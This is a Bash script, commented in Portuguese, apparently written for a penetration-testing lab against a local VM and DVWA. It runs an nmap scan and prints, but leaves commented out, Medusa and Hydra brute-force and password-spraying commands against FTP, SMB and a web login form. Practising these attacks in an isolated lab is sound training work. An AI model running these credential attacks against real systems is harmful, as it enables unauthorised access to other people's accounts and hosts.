#!/bin/bash
# Script de exemplo: executar ataques controlados em ambiente isolado
# ATENÇÃO: verifique IPs, usuários e wordlists antes de rodar.
# Uso: bash scripts/run-attacks.sh

TARGET="192.168.56.101"      # <-- altere para o IP da VM alvo
WORDLIST="../wordlists/common-passwords.txt"
SMB_USERS="../wordlists/smb-users.txt"

echo "[*] Reconhecimento rápido (nmap)"
nmap -sS -sV -O -Pn $TARGET

echo
echo "[*] Força bruta FTP com Medusa (exemplo)"
echo "medusa -h $TARGET -u msfadmin -P $WORDLIST -M ftp"
# descomente a linha abaixo para executar (com responsabilidade)
# medusa -h $TARGET -u msfadmin -P $WORDLIST -M ftp

echo
echo "[*] Password spraying SMB com Medusa (exemplo)"
echo "medusa -h $TARGET -U $SMB_USERS -P $WORDLIST -M smbnt"
# medusa -h $TARGET -U $SMB_USERS -P $WORDLIST -M smbnt

echo
echo "[*] Teste de formulário web (exemplo com Hydra)"
echo "hydra -l admin -P $WORDLIST $TARGET http-form-post \"/dvwa/login.php:username=^USER^&password=^PASS^:Login failed\""
# hydra -l admin -P $WORDLIST $TARGET http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^:Login failed"

echo
echo "[*] FIM - revise outputs e salve evidências em /images"